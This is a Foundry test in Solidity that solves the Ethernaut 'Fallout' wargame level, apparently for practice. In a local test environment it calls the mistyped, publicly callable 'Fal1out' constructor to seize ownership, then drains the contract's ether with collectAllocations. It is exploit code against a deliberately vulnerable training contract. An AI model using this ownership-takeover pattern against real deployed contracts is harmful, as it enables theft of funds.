// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import "forge-std/Test.sol";

interface Fallout {
    function Fal1out() external payable;

    function collectAllocations() external;

    function allocate() external payable;

    function sendAllocation() external;

    function allocatorBalance(address allocator)
        external
        view
        returns (uint256);
}

contract FalloutTest is Test {
    Fallout public fallout = Fallout(address(64));
    address public owner;
    address public attacker;
    bytes bytecode = abi.encodePacked(vm.getCode("Fallout.sol"));

    function setUp() public {
        owner = makeAddr("owner");
        attacker = makeAddr("attacker");
        startHoax(owner);
        bytes memory code = vm.getDeployedCode("Fallout.sol");
        vm.etch(address(fallout), code);
        (bool success, ) = payable(address(fallout)).call{value: 1 ether}("");
        require(success, "Failled to transfer ether to fallout");
        assertEq(address(fallout).code, code);
    }

    function testFallout() public {
        vm.stopPrank();
        startHoax(attacker);
        fallout.Fal1out();
        fallout.collectAllocations();
        console.logUint(address(fallout).balance);
        assertEq(address(fallout).balance, 0);
    }
}
